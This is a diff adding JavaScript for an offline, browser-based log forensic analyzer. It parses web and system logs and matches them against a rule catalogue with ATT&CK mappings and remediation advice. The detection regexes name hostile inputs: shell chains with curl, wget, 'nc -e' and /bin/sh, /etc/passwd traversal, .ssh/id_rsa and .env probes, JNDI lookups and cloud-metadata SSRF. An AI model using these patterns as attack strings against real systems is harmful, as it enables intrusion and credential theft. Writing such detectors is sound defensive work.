+function Sink(fileId) {
+  this.fileId = fileId;
+  this.n = 0;
+  this.ts = new Float64Array(BATCH);
+  this.status = new Uint16Array(BATCH);
+  this.bytes = new Float64Array(BATCH);
+  this.method = new Uint8Array(BATCH);
+  this.ip = new Uint32Array(BATCH);
+  this.url = new Uint32Array(BATCH);
+  this.ua = new Uint32Array(BATCH);
+  this.ref = new Uint32Array(BATCH);
+  this.flags = new Uint32Array(BATCH);
+  this.rawIdx = []; this.rawStr = [];
+  this.dIp = new Dict(); this.dUrl = new Dict(); this.dUa = new Dict(); this.dRef = new Dict();
+}
+Sink.prototype.urlId = function (s) {
+  var before = this.dUrl.arr.length, id = this.dUrl.id(s);
+  if (id === before) this.dUrl.flags[id] = scoreUrl(s);
+  return id;
+};
+Sink.prototype.uaId = function (s) {
+  var before = this.dUa.arr.length, id = this.dUa.id(s);
+  if (id === before) this.dUa.flags[id] = scoreUa(s);
+  return id;
+};
+Sink.prototype.push = function (rec, raw) {
+  var i = this.n;
+  this.ts[i] = rec.ts;
+  this.status[i] = rec.status;
+  this.bytes[i] = rec.bytes;
+  this.method[i] = rec.method;
+  this.ip[i] = rec.ip;
+  this.url[i] = rec.url;
+  this.ua[i] = rec.ua;
+  this.ref[i] = rec.ref;
+  var f = this.dUrl.flags[rec.url] | this.dUa.flags[rec.ua];
+  if (rec.status === 401 || rec.status === 403) f |= (1 << BIT.auth_failure);
+  if (rec.status >= 500) f |= (1 << BIT.server_error);
+  if (SUSPICIOUS_METHOD[rec.method]) f |= (1 << BIT.suspicious_method);
+  this.flags[i] = f;
+  if (f && this.rawIdx.length < RAW_PER_BATCH) { this.rawIdx.push(i); this.rawStr.push(raw.length > 2000 ? raw.slice(0, 2000) : raw); }
+  this.n++;
+  if (this.n >= BATCH) this.flush();
+};
+Sink.prototype.flush = function () {
+  if (!this.n) return;
+  var n = this.n;
+  var msg = {
+    t: "batch", fileId: this.fileId, n: n,
+    ts: this.ts.slice(0, n), status: this.status.slice(0, n), bytes: this.bytes.slice(0, n),
+    method: this.method.slice(0, n), ip: this.ip.slice(0, n), url: this.url.slice(0, n),
+    ua: this.ua.slice(0, n), ref: this.ref.slice(0, n), flags: this.flags.slice(0, n),
+    dict: { ip: this.dIp.delta(), url: this.dUrl.delta(), ua: this.dUa.delta(), ref: this.dRef.delta() },
+    rawIdx: this.rawIdx.slice(), rawStr: this.rawStr.slice()
+  };
+  postMessage(msg, [msg.ts.buffer, msg.status.buffer, msg.bytes.buffer, msg.method.buffer,
+    msg.ip.buffer, msg.url.buffer, msg.ua.buffer, msg.ref.buffer, msg.flags.buffer]);
+  this.n = 0; this.rawIdx.length = 0; this.rawStr.length = 0;
+};
+
+/* ----------------------------------------------------------- line parsers - */
+var REC = { ts: 0, status: 0, bytes: 0, method: 0, ip: 0, url: 0, ua: 0, ref: 0 };
+
+function methodCode(m) { var c = METHOD_IDX[m]; return c === undefined ? OTHER : c; }
+
+function parseCLF(line, sink) {
+  var n = tokenize(line);
+  if (n < 4) return false;
+  var di = -1;
+  for (var i = 0; i < n; i++) if (TOKT[i] === 3) { di = i; break; }
+  if (di < 1) return false;
+  var ts = parseCLFDate(TOKV[di]);
+  if (ts !== ts) return false;
+  var host = TOKV[di >= 3 ? di - 3 : 0];
+  var reqI = -1;
+  for (var j = di + 1; j < n; j++) if (TOKT[j] === 2) { reqI = j; break; }
+  if (reqI < 0) return false;
+  var req = TOKV[reqI], method = "OTHER", url = req;
+  var sp = req.indexOf(" ");
+  if (sp > 0) {
+    method = req.slice(0, sp);
+    var rest = req.slice(sp + 1), sp2 = rest.lastIndexOf(" HTTP/");
+    url = sp2 > 0 ? rest.slice(0, sp2) : rest;
+  }
+  var status = 0, bytes = 0, k = reqI + 1;
+  for (; k < n; k++) { if (TOKT[k] === 1) { var v = +TOKV[k]; if (v >= 100 && v < 600) { status = v; break; } } }
+  if (k + 1 < n) { var b = +TOKV[k + 1]; bytes = b === b ? b : 0; }
+  var ref = "-", ua = "-", q = 0;
+  for (var z = k + 1; z < n; z++) if (TOKT[z] === 2) { if (q === 0) { ref = TOKV[z]; q = 1; } else { ua = TOKV[z]; break; } }
+  REC.ts = ts; REC.status = status; REC.bytes = bytes;
+  REC.method = methodCode(method);
+  REC.ip = sink.dIp.id(host);
+  REC.url = sink.urlId(url);
+  REC.ua = sink.uaId(ua);
+  REC.ref = sink.dRef.id(ref);
+  sink.push(REC, line);
+  return true;
+}
+
+function parseJSONLine(line, sink) {
+  var o;
+  try { o = JSON.parse(line); } catch (e) { return false; }
+  if (!o || typeof o !== "object") return false;
+  var flat = flatten(o, {}, "", 0);
+  var ip = pick(flat, JSON_KEYS.ip), ts = pick(flat, JSON_KEYS.ts);
+  var url = pick(flat, JSON_KEYS.url), method = pick(flat, JSON_KEYS.method);
+  var status = pick(flat, JSON_KEYS.status), bytes = pick(flat, JSON_KEYS.bytes);
+  var ua = pick(flat, JSON_KEYS.ua), ref = pick(flat, JSON_KEYS.ref);
+  if (typeof url === "string" && url.indexOf(" ") > 0 && /^[A-Z]+ /.test(url)) {
+    var parts = url.split(" ");
+    if (!method) method = parts[0];
+    url = parts[1] || url;
+  }
+  var t = typeof ts === "number" ? (ts > 1e12 ? ts : ts * 1000) : parseAnyDate(String(ts || ""));
+  REC.ts = t === t ? t : 0;
+  REC.status = +status || 0;
+  REC.bytes = +bytes || 0;
+  REC.method = methodCode(String(method || "OTHER").toUpperCase());
+  REC.ip = sink.dIp.id(String(ip || "-"));
+  REC.url = sink.urlId(String(url || line.slice(0, 300)));
+  REC.ua = sink.uaId(String(ua || "-"));
+  REC.ref = sink.dRef.id(String(ref || "-"));
+  sink.push(REC, line);
+  return true;
+}
+
+var W3C = null;
+function parseW3C(line, sink) {
+  if (line.charCodeAt(0) === 35) {
+    var m = /^#Fields:\s*(.*)$/i.exec(line);
+    if (m) { W3C = m[1].trim().toLowerCase().split(/\s+/); }
+    return true;
+  }
+  if (!W3C) return false;
+  var p = line.split(" ");
+  var g = function (name) { var i = W3C.indexOf(name); return i >= 0 && i < p.length ? p[i] : undefined; };
+  var date = g("date"), time = g("time");
+  var ts = date && time ? Date.parse(date + "T" + time + "Z") : NaN;
+  var stem = g("cs-uri-stem") || "-", qs = g("cs-uri-query");
+  var url = qs && qs !== "-" ? stem + "?" + qs : stem;
+  REC.ts = ts === ts ? ts : 0;
+  REC.status = +(g("sc-status") || 0) || 0;
+  REC.bytes = +(g("sc-bytes") || 0) || 0;
+  REC.method = methodCode((g("cs-method") || "OTHER").toUpperCase());
+  REC.ip = sink.dIp.id(g("c-ip") || g("s-ip") || "-");
+  REC.url = sink.urlId(url);
+  REC.ua = sink.uaId((g("cs(user-agent)") || "-").replace(/\+/g, " "));
+  REC.ref = sink.dRef.id((g("cs(referer)") || "-").replace(/\+/g, " "));
+  sink.push(REC, line);
+  return true;
+}
+
+var RE_NGX_ERR = /^(\d{4}\/\d\d\/\d\d \d\d:\d\d:\d\d) \[(\w+)\]/;
+var RE_NGX_CLIENT = /client: ([0-9a-fA-F.:]+)/;
+var RE_NGX_REQ = /request: "([^"]*)"/;
+function parseNginxError(line, sink) {
+  var m = RE_NGX_ERR.exec(line);
+  if (!m) return false;
+  var sev = m[2];
+  var c = RE_NGX_CLIENT.exec(line), r = RE_NGX_REQ.exec(line);
+  var method = "OTHER", url = line.slice(m[0].length).trim();
+  if (r) { var parts = r[1].split(" "); method = parts[0] || "OTHER"; url = parts[1] || r[1]; }
+  REC.ts = parseAnyDate(m[1]) || 0;
+  REC.status = sev === "error" || sev === "crit" || sev === "alert" || sev === "emerg" ? 500 : (sev === "warn" ? 400 : 0);
+  REC.bytes = 0;
+  REC.method = methodCode(method.toUpperCase());
+  REC.ip = sink.dIp.id(c ? c[1] : "-");
+  REC.url = sink.urlId(url);
+  REC.ua = sink.uaId("-");
+  REC.ref = sink.dRef.id(sev);
+  sink.push(REC, line);
+  return true;
+}
+
+var RE_SYSLOG5 = /^<(\d{1,3})>1 (\S+) (\S+) (\S+) (\S+) (\S+) (.*)$/;
+var RE_SYSLOG3 = /^([A-Z][a-z]{2} [ \d]\d \d\d:\d\d:\d\d) (\S+) ([^:]+): ?(.*)$/;
+function parseSyslog(line, sink) {
+  var m = RE_SYSLOG5.exec(line), host, app, msg, ts;
+  if (m) { ts = parseAnyDate(m[2]); host = m[3]; app = m[4]; msg = m[7]; }
+  else {
+    m = RE_SYSLOG3.exec(line);
+    if (!m) return false;
+    var y = new Date().getUTCFullYear();
+    ts = parseAnyDate(m[1] + " " + y); host = m[2]; app = m[3]; msg = m[4];
+  }
+  REC.ts = ts === ts ? ts : 0;
+  REC.status = /fail|denied|invalid|error|refus/i.test(msg) ? 403 : 0;
+  REC.bytes = 0;
+  REC.method = OTHER;
+  var ipm = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/.exec(msg);
+  REC.ip = sink.dIp.id(ipm ? ipm[1] : host);
+  REC.url = sink.urlId(msg.length > 400 ? msg.slice(0, 400) : msg);
+  REC.ua = sink.uaId(app);
+  REC.ref = sink.dRef.id(host);
+  sink.push(REC, line);
+  return true;
+}
+
+var RE_IP = /\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/;
+var RE_TS_ISO = /\b(\d{4}-\d\d-\d\dT?[ ]?\d\d:\d\d:\d\d(?:\.\d+)?(?:Z|[+-]\d\d:?\d\d)?)\b/;
+var RE_TS_CLF = /\[(\d\d\/[A-Za-z]{3}\/\d{4}:\d\d:\d\d:\d\d[^\]]*)\]/;
+var RE_STATUS = /\s([1-5]\d\d)\s/;
+function parseGeneric(line, sink) {
+  var ipm = RE_IP.exec(line);
+  var tm = RE_TS_ISO.exec(line) || RE_TS_CLF.exec(line);
+  var st = RE_STATUS.exec(line);
+  REC.ts = tm ? (parseAnyDate(tm[1]) || 0) : 0;
+  REC.status = st ? +st[1] : 0;
+  REC.bytes = 0;
+  REC.method = OTHER;
+  REC.ip = sink.dIp.id(ipm ? ipm[1] : "-");
+  REC.url = sink.urlId(line.length > 400 ? line.slice(0, 400) : line);
+  REC.ua = sink.uaId("-");
+  REC.ref = sink.dRef.id("-");
+  sink.push(REC, line);
+  return true;
+}
+
+var PARSERS = {
+  clf: parseCLF, json: parseJSONLine, w3c: parseW3C,
+  nginx_error: parseNginxError, syslog: parseSyslog, generic: parseGeneric
+};
+
+/* --------------------------------------------------------- stream reader -- */
+function makeStream(file) {
+  var s = file.stream ? file.stream() : null;
+  if (!s) return null;
+  if (/\.gz$/i.test(file.name) && typeof DecompressionStream !== "undefined") {
+    try { s = s.pipeThrough(new DecompressionStream("gzip")); } catch (e) { /* fall through raw */ }
+  }
+  return s;
+}
+
+async function readByStream(file, onChunk) {
+  var stream = makeStream(file);
+  if (!stream) throw new Error("no-stream");
+  var reader = stream.getReader();
+  var dec = new TextDecoder("utf-8");
+  for (;;) {
+    var r = await reader.read();
+    if (r.done) break;
+    onChunk(dec.decode(r.value, { stream: true }), r.value.byteLength);
+  }
+  onChunk(dec.decode(), 0);
+}
+
+function readBySlice(file, onChunk) {
+  return new Promise(function (resolve, reject) {
+    var CH = 8 * 1024 * 1024, off = 0, dec = new TextDecoder("utf-8");
+    var step = function () {
+      if (off >= file.size) { onChunk(dec.decode(), 0); resolve(); return; }
+      var blob = file.slice(off, Math.min(off + CH, file.size));
+      var fr = new FileReader();
+      fr.onerror = function () { reject(fr.error || new Error("read-error")); };
+      fr.onload = function () {
+        var buf = fr.result;
+        onChunk(dec.decode(new Uint8Array(buf), { stream: true }), buf.byteLength);
+        off += CH;
+        step();
+      };
+      fr.readAsArrayBuffer(blob);
+    };
+    step();
+  });
+}
+
+/* ------------------------------------------------------------------ main -- */
+async function run(fileId, file) {
+  var sink = new Sink(fileId);
+  var tail = "", lines = 0, parsed = 0, skipped = 0, bytes = 0;
+  var sample = [], detected = null, parser = null, lastTick = 0;
+  W3C = null;
+
+  var handleLine = function (line) {
+    if (!line) return;
+    if (line.charCodeAt(line.length - 1) === 13) line = line.slice(0, -1);
+    if (!line) return;
+    lines++;
+    if (!parser) {
+      sample.push(line);
+      if (sample.length >= 400) startParsing();
+      return;
+    }
+    if (parser(line, sink)) parsed++; else { skipped++; if (skipped < 40) { sink.rawIdx.push(-1); sink.rawStr.push(line); } }
+  };
+
+  var startParsing = function () {
+    detected = probe(sample);
+    parser = PARSERS[detected.format] || parseGeneric;
+    var hit = 0, miss = 0, i;
+    for (i = 0; i < sample.length; i++) { if (parser(sample[i], sink)) hit++; else miss++; }
+    /* the probe was wrong about this file — take what the generic extractor can get */
+    if (hit === 0 && sample.length >= 5 && parser !== parseGeneric) {
+      parser = parseGeneric; detected = { format: "generic", confidence: 0 };
+      hit = 0; miss = 0;
+      for (i = 0; i < sample.length; i++) { if (parser(sample[i], sink)) hit++; else miss++; }
+    }
+    parsed += hit; skipped += miss;
+    postMessage({ t: "fmt", fileId: fileId, format: detected.format, confidence: detected.confidence });
+    sample.length = 0;
+  };
+
+  var onChunk = function (text, byteLen) {
+    bytes += byteLen;
+    if (!text) return;
+    var start = 0, idx;
+    text = tail + text;
+    tail = "";
+    while ((idx = text.indexOf("\n", start)) !== -1) { handleLine(text.slice(start, idx)); start = idx + 1; }
+    tail = text.slice(start);
+    if (tail.length > 1e7) { handleLine(tail); tail = ""; }  // pathological single-line file
+    var now = Date.now();
+    if (now - lastTick > 200) {
+      lastTick = now;
+      postMessage({ t: "progress", fileId: fileId, bytes: bytes, lines: lines, size: file.size });
+    }
+  };
+
+  try {
+    try { await readByStream(file, onChunk); }
+    catch (e) { await readBySlice(file, onChunk); }
+    if (tail) handleLine(tail);
+    if (!parser && sample.length) startParsing();
+    sink.flush();
+    postMessage({
+      t: "done", fileId: fileId, lines: lines, parsed: parsed, skipped: skipped,
+      bytes: bytes, format: detected ? detected.format : "generic",
+      confidence: detected ? detected.confidence : 0
+    });
+  } catch (err) {
+    postMessage({ t: "error", fileId: fileId, message: String(err && err.message || err) });
+  }
+}
+
+self.onmessage = function (e) {
+  var d = e.data;
+  if (d.cmd === "init") {
+    RULES = d.rules.map(function (r) { return { bit: r.bit, target: r.target, re: new RegExp(r.pattern, r.flags) }; });
+    BIT = d.bits;
+    postMessage({ t: "ready" });
+    return;
+  }
+  if (d.cmd === "parse") run(d.fileId, d.file);
+};
+</script>
+<script>
+"use strict";
+/* ============================================================================
+   VEHCS LOG ANALYZER — forensic console
+   Single file, zero dependencies, zero network. Architecture:
+
+     File  ->  Worker (stream decode, format probe, parse, signature match)
+           ->  columnar batches (transferable typed arrays + dictionary deltas)
+           ->  main-thread ColumnStore (dictionary-encoded, growable)
+           ->  behavioural analytics pass (per-IP profiling, risk scoring)
+           ->  query compiler (dictionary masks) -> view index (Uint32Array)
+           ->  virtualised table + canvas charts
+   ========================================================================== */
+
+/* ------------------------------------------------------- rule catalogue --- */
+/* Single source of truth. Regex rules are shipped to the worker at init;
+   synthetic rules (pattern:null) are raised from numeric fields, and
+   behavioural rules are raised by the analytics pass on the main thread. */
+const RULES = [
+  { id:"sqli", bit:0, sev:"critical", target:"url", label:"SQL injection attempt",
+    why:"Union/boolean/time-based SQL payload in the request",
+    pattern:"(union[\\s/*]+select)|(\\bor\\b\\s+1\\s*=\\s*1)|(information_schema)|(\\bsleep\\s*\\(\\s*\\d)|(benchmark\\s*\\()|(xp_cmdshell)|(waitfor\\s+delay)|(concat\\s*\\(\\s*0x)|('\\s*or\\s*')|(\\bselect\\b.{0,40}\\bfrom\\b)|(\\bdrop\\s+table\\b)", flags:"i" },
+  { id:"xss", bit:1, sev:"high", target:"url", label:"Cross-site scripting",
+    why:"Script/handler injection in URL or referrer",
+    pattern:"(<\\s*script)|(onerror\\s*=)|(onload\\s*=)|(javascript:)|(<\\s*svg)|(<\\s*iframe)|(document\\.cookie)|(alert\\s*\\()", flags:"i" },
+  { id:"traversal", bit:2, sev:"high", target:"url", label:"Path traversal",
+    why:"Relative path escapes or classic target files",
+    pattern:"(\\.\\./)|(\\.\\.\\\\)|(%2e%2e)|(\\.\\.%2f)|(%252e%252e)|(/etc/passwd)|(boot\\.ini)|(win\\.ini)|(/proc/self/environ)", flags:"i" },
+  { id:"cmdi", bit:3, sev:"critical", target:"url", label:"Command injection",
+    why:"Shell metacharacters chained to system binaries",
+    pattern:"(;\\s*(cat|ls|id|whoami|uname|curl|wget|nc|bash|sh)\\b)|(\\|\\s*(cat|ls|id|whoami|curl|wget|nc)\\b)|(\\bnc\\s+-e\\b)|(/bin/(ba)?sh)|(%0a(cat|id|ls|whoami))|(\\$\\(\\s*(id|whoami|cat)\\s*\\))", flags:"i" },
+  { id:"lfi_rfi", bit:4, sev:"high", target:"url", label:"File inclusion",
+    why:"Local/remote include parameter pointing off-path",
+    pattern:"([?&](file|page|include|template|doc|document|folder|root|pg|style|pdf|view|conf)=(https?(:|%3a)|//|\\.\\./|php://|file://|data://|expect://))|(php://(input|filter))", flags:"i" },
+  { id:"log4shell", bit:5, sev:"critical", target:"any", label:"JNDI / Log4Shell probe",
+    why:"JNDI lookup expression in request or header",
+    pattern:"(\\$\\{jndi:)|(\\$\\{\\s*\\$\\{)|(\\$\\{lower:)|(\\$\\{env:)|(%24%7bjndi)", flags:"i" },
+  { id:"ssti", bit:6, sev:"high", target:"url", label:"Template injection",
+    why:"Template expression syntax submitted as input",
+    pattern:"(\\{\\{.{0,60}\\}\\})|(\\$\\{\\s*\\d+\\s*\\*\\s*\\d+\\s*\\})|(<%=.{0,40}%>)|(#\\{.{0,40}\\})", flags:"i" },
+  { id:"webshell", bit:7, sev:"critical", target:"url", label:"Web shell access",
+    why:"Known shell filenames or executable dropped in an upload path",
+    pattern:"((c99|r57|wso|b374k|alfa|shell|cmd|backdoor|webshell)\\.(php|asp|aspx|jsp|jspx))|(eval\\s*\\(\\s*base64_decode)|(/uploads?/[^ ]{0,40}\\.(php|jsp|asp)\\b)", flags:"i" },
+  { id:"sensitive_path", bit:8, sev:"high", target:"url", label:"Sensitive path probe",
+    why:"Request for secrets, VCS metadata, or admin surfaces",
+    pattern:"(/\\.env)|(/\\.git/)|(/\\.svn/)|(/\\.aws/)|(/\\.ssh/)|(/id_rsa)|(/wp-login\\.php)|(/wp-admin)|(/xmlrpc\\.php)|(/phpmyadmin)|(/pma/)|(/adminer)|(/actuator)|(/server-status)|(/\\.DS_Store)|(/web\\.config)|(/config\\.(php|json|ya?ml|inc))|(/backup[^ ]{0,10}\\.(sql|zip|tar|gz|bak))|(/solr/)|(/jenkins)|(/telescope)|(/credentials)|(/\\.git/config)", flags:"i" },
+  { id:"ssrf", bit:9, sev:"high", target:"url", label:"SSRF / metadata probe",
+    why:"Parameter pointing at internal or cloud-metadata addresses",
+    pattern:"(([?&])(url|uri|target|dest|destination|callback|out|image_url|proxy|fetch|src)=(https?(:|%3a)|//|127\\.0\\.0\\.1|localhost|169\\.254\\.169\\.254|0x7f|\\[::1\\]))|(169\\.254\\.169\\.254)|(metadata\\.google\\.internal)", flags:"i" },
+  { id:"open_redirect", bit:10, sev:"medium", target:"url", label:"Open redirect attempt",
+    why:"Redirect parameter carrying an absolute external URL",
+    pattern:"([?&](redirect|redirect_uri|next|returnurl|return_to|continue|dest)=(https?(:|%3a)(%2f|/){2}))", flags:"i" },
+  { id:"crlf", bit:11, sev:"medium", target:"url", label:"CRLF / header injection",
+    why:"Encoded line breaks in the request line",
+    pattern:"(%0d%0a)|(%0a%0d)|(%250d%250a)", flags:"i" },
+  { id:"nullbyte", bit:12, sev:"high", target:"url", label:"Null byte injection",
+    why:"Null byte used to truncate a filename or filter",
+    pattern:"(%00)|(%2500)", flags:"i" },
+  { id:"double_encoded", bit:13, sev:"medium", target:"url", label:"Double-encoded payload",
+    why:"Double URL-encoding used to slip past filters",
+    pattern:"(%25(3c|3e|27|22|2e|2f|5c|00|7b))", flags:"i" },
+  { id:"scanner_ua", bit:14, sev:"high", target:"ua", label:"Security scanner",
+    why:"User-agent self-identifies as an offensive tool",
+    pattern:"(sqlmap|nikto|nmap|masscan|zgrab|nuclei|dirbuster|gobuster|feroxbuster|ffuf|wpscan|acunetix|nessus|openvas|arachni|w3af|havij|hydra|metasploit|burp|xsstrike|commix|whatweb|joomscan|dirsearch)", flags:"i" },
+  { id:"automation_ua", bit:15, sev:"low", target:"ua", label:"Scripted client",
+    why:"Non-browser HTTP client — normal for APIs, notable for web tiers",
+    pattern:"(python-requests|python-urllib|curl/|wget|go-http-client|libwww|java/|okhttp|scrapy|axios/|node-fetch|guzzle|httpclient|winhttp|powershell|postmanruntime)", flags:"i" },
+  { id:"shellshock", bit:16, sev:"critical", target:"any", label:"Shellshock probe",
+    why:"Bash function-definition prefix in a header or URL",
+    pattern:"(\\(\\s*\\)\\s*\\{)|(\\{\\s*:;\\s*;\\s*\\})", flags:"i" },
+  { id:"auth_msg", bit:17, sev:"medium", target:"url", label:"Authentication failure message",
+    why:"Host/application log line reporting a rejected credential",
+    pattern:"(failed password|authentication failure|invalid user|login failed|access denied|permission denied|auth fail)", flags:"i" },
+  /* synthetic (no regex) --------------------------------------------------- */
+  { id:"empty_ua", bit:18, sev:"low", target:"ua", label:"Missing user-agent", why:"Client sent no user-agent", pattern:null },
+  { id:"long_url", bit:19, sev:"low", target:"url", label:"Oversized request line", why:"Request line beyond 512 bytes — buffer or payload stuffing", pattern:null },
+  { id:"auth_failure", bit:20, sev:"low", label:"401 / 403 response", why:"Server rejected the request as unauthorised", pattern:null },
+  { id:"server_error", bit:21, sev:"medium", label:"5xx server error", why:"Server-side failure", pattern:null },
+  { id:"suspicious_method", bit:22, sev:"medium", label:"Unusual HTTP method", why:"PUT/DELETE/TRACE/CONNECT/PROPFIND against a web tier", pattern:null },
+  /* behavioural (raised by the analytics pass) ----------------------------- */
+  { id:"brute_force", bit:23, sev:"critical", label:"Credential brute force", why:"Repeated auth failures against login endpoints from one source", pattern:null, behavioural:true },
+  { id:"dir_scan", bit:24, sev:"high", label:"Directory / content scan", why:"High volume of distinct 404 paths from one source", pattern:null, behavioural:true },
+  { id:"beaconing", bit:25, sev:"critical", label:"Beaconing interval", why:"Machine-regular request cadence — implant check-in pattern", pattern:null, behavioural:true },
+  { id:"exfil", bit:26, sev:"high", label:"Large outbound transfer", why:"Response volume far above the population norm", pattern:null, behavioural:true },
+  { id:"rate_abuse", bit:27, sev:"medium", label:"Request flood", why:"Sustained request rate above the per-source threshold", pattern:null, behavioural:true },
+  { id:"error_burst", bit:28, sev:"medium", label:"Error burst source", why:"Source responsible for a statistically abnormal 5xx cluster", pattern:null, behavioural:true }
+];
+const RULE_BY_ID = {}; const RULE_BY_BIT = [];
+const BITS = {};
+RULES.forEach(r => { RULE_BY_ID[r.id] = r; RULE_BY_BIT[r.bit] = r; BITS[r.id] = r.bit; });
+const SEV_ORDER = { critical:0, high:1, medium:2, low:3 };
+const SEV_COLOR = { critical:"var(--sev-critical)", high:"var(--sev-high)", medium:"var(--sev-medium)", low:"var(--sev-low)" };
+
+/* ------------------------------------------------- MITRE ATT&CK mapping --- *
+   Each detection rule is mapped to the ATT&CK technique it evidences, so the
+   report speaks the language a SOC / IR team already uses.                    */
+const MITRE_MAP = {
+  sqli:            { tactic:"Initial Access",      id:"T1190",      name:"Exploit Public-Facing Application" },
+  xss:             { tactic:"Execution",           id:"T1059.007",  name:"JavaScript / Cross-Site Scripting" },
+  traversal:       { tactic:"Discovery",           id:"T1083",      name:"File and Directory Discovery" },
+  cmdi:            { tactic:"Execution",           id:"T1059",      name:"Command and Scripting Interpreter" },
+  lfi_rfi:         { tactic:"Initial Access",      id:"T1190",      name:"Exploit Public-Facing Application" },
+  log4shell:       { tactic:"Initial Access",      id:"T1190",      name:"Exploit Public-Facing Application (CVE-2021-44228)" },
+  ssti:            { tactic:"Execution",           id:"T1059",      name:"Server-Side Template Injection" },
+  webshell:        { tactic:"Persistence",         id:"T1505.003",  name:"Web Shell" },
+  sensitive_path:  { tactic:"Reconnaissance",      id:"T1592",      name:"Gather Victim Host Information" },
+  ssrf:            { tactic:"Credential Access",   id:"T1552.005",  name:"Cloud Instance Metadata API" },
+  open_redirect:   { tactic:"Initial Access",      id:"T1204",      name:"User Execution (redirect abuse)" },
+  crlf:            { tactic:"Initial Access",      id:"T1190",      name:"HTTP Response Splitting" },
+  nullbyte:        { tactic:"Defense Evasion",     id:"T1027",      name:"Obfuscated Files or Information" },
+  double_encoded:  { tactic:"Defense Evasion",     id:"T1027",      name:"Obfuscated Files or Information" },
+  scanner_ua:      { tactic:"Reconnaissance",      id:"T1595.002",  name:"Vulnerability Scanning" },
+  automation_ua:   { tactic:"Reconnaissance",      id:"T1595",      name:"Active Scanning" },
+  shellshock:      { tactic:"Initial Access",      id:"T1190",      name:"Exploit Public-Facing Application (CVE-2014-6271)" },
+  auth_msg:        { tactic:"Credential Access",   id:"T1110",      name:"Brute Force" },
+  empty_ua:        { tactic:"Reconnaissance",      id:"T1595",      name:"Active Scanning" },
+  long_url:        { tactic:"Initial Access",      id:"T1190",      name:"Exploit Public-Facing Application" },
+  auth_failure:    { tactic:"Credential Access",   id:"T1110",      name:"Brute Force" },
+  server_error:    { tactic:"Impact",              id:"T1499",      name:"Endpoint Denial of Service" },
+  suspicious_method:{ tactic:"Initial Access",     id:"T1190",      name:"Exploit Public-Facing Application" },
+  brute_force:     { tactic:"Credential Access",   id:"T1110.001",  name:"Password Guessing" },
+  dir_scan:        { tactic:"Reconnaissance",      id:"T1595.003",  name:"Wordlist Scanning" },
+  beaconing:       { tactic:"Command and Control", id:"T1071.001",  name:"Web Protocols (C2 beaconing)" },
+  exfil:           { tactic:"Exfiltration",        id:"T1041",      name:"Exfiltration Over C2 Channel" },
+  rate_abuse:      { tactic:"Impact",              id:"T1498",      name:"Network Denial of Service" },
+  error_burst:     { tactic:"Impact",              id:"T1499",      name:"Endpoint Denial of Service" }
+};
+
+/* ---------------------------------------------- remediation playbook ------ *
+   Concrete, prioritised guidance per detection category for the report's
+   Recommendations section — written for an operator, not a checkbox.        */
+const REMEDIATION = {
+  sqli:           "Parameterise every database query (prepared statements); reject requests containing SQL meta-syntax at the WAF; audit the targeted endpoints for successful data return in the response bodies.",
+  xss:            "Context-encode all reflected output and set a strict Content-Security-Policy; treat any 200 response to a script payload as a probable stored/reflected XSS foothold.",
+  traversal:      "Canonicalise and allow-list file paths server-side; block '../', encoded traversal, and absolute system paths at the edge; confirm whether /etc/passwd or config files were actually served (2xx).",
+  cmdi:           "Never pass request data to a shell; use argument arrays and strict allow-lists. Any 2xx on a command-injection payload is a suspected RCE — isolate and forensicate the host.",
+  lfi_rfi:        "Disable remote URL includes; allow-list local includes; verify no php://, data://, or remote URLs were fetched.",
+  log4shell:      "Patch Log4j to a fixed release; block ${jndi:} lookups; hunt for outbound LDAP/RMI from application hosts.",
+  ssti:           "Do not concatenate user input into templates; sandbox the template engine; review any endpoint returning evaluated arithmetic.",
+  webshell:       "Search the webroot and upload directories for recently written script files; restrict upload types and execution permissions; a served shell path is an active compromise.",
+  sensitive_path: "Remove secrets, VCS metadata (.git/.env), and admin surfaces from web-reachable paths; return 404 uniformly; rotate any credentials that may have been exposed.",
+  ssrf:           "Block requests to link-local/metadata ranges (169.254.169.254) and internal hosts; enforce egress allow-lists on the application tier; move to IMDSv2 on AWS.",
+  open_redirect:  "Allow-list redirect targets; never redirect to attacker-supplied absolute URLs.",
+  crlf:           "Reject encoded CR/LF in request lines and headers; keep header-writing APIs strict.",
+  nullbyte:       "Reject null bytes in paths and parameters; use length-safe string handling.",
+  double_encoded: "Decode-then-validate; reject requests that only make sense after multiple decode passes.",
+  scanner_ua:     "These are reconnaissance tools. Rate-limit and block the tooling signatures at the edge; treat their target list as your exposed-surface inventory.",
+  brute_force:    "Enforce account lockout / exponential back-off and MFA on the targeted login endpoints; alert on repeated 401/403 bursts.",
+  dir_scan:       "Deploy a rate-limit + 404 tarpit for high-cardinality path enumeration; review what the scan actually found (any 200s).",
+  beaconing:      "Regular-interval check-ins indicate an implant or bot. Identify the internal host behind the request pattern and inspect it for persistence.",
+  exfil:          "Baseline normal response sizes and alert on outliers; inspect the large-transfer endpoints for data-returning injection.",
+  rate_abuse:     "Apply per-source and per-endpoint rate limits; front the service with a CDN/WAF capable of absorbing floods.",
+  error_burst:    "A source driving abnormal 5xx volume is either fuzzing or triggering a bug — capture full requests for the window and review application logs."
+};
+
+
+const METHODS = ["GET","POST","PUT","DELETE","HEAD","OPTIONS","PATCH","TRACE","CONNECT","PROPFIND","OTHER"];
+
+/* --------------------------------------------------------- dictionaries --- */
+function makeDict(){ return { arr:[], map:new Map(), lower:[], lowerN:0 }; }
+const D = { ip:makeDict(), url:makeDict(), ua:makeDict(), ref:makeDict() };
+
+function intern(dict, s){
+  let v = dict.map.get(s);
+  if (v !== undefined) return v;
+  v = dict.arr.length; dict.map.set(s, v); dict.arr.push(s);
+  return v;
+}
+function lowerOf(dict){
+  for (let i = dict.lowerN; i < dict.arr.length; i++) dict.lower.push(dict.arr[i].toLowerCase());
+  dict.lowerN = dict.arr.length;
+  return dict.lower;
+}
+
+/* ------------------------------------------------------------ the store --- */
+const Store = {
+  n:0, cap:0,
+  ts:null, status:null, bytes:null, method:null,
+  ip:null, url:null, ua:null, ref:null, flags:null, file:null,
+  raw:new Map(),          // rowId -> original line (flagged rows only)
+  unparsed:[],            // sample of lines no parser accepted
+  init(cap){
+    this.cap = cap; this.n = 0;
+    this.ts = new Float64Array(cap); this.status = new Uint16Array(cap);
+    this.bytes = new Float64Array(cap); this.method = new Uint8Array(cap);
+    this.ip = new Uint32Array(cap); this.url = new Uint32Array(cap);
+    this.ua = new Uint32Array(cap); this.ref = new Uint32Array(cap);
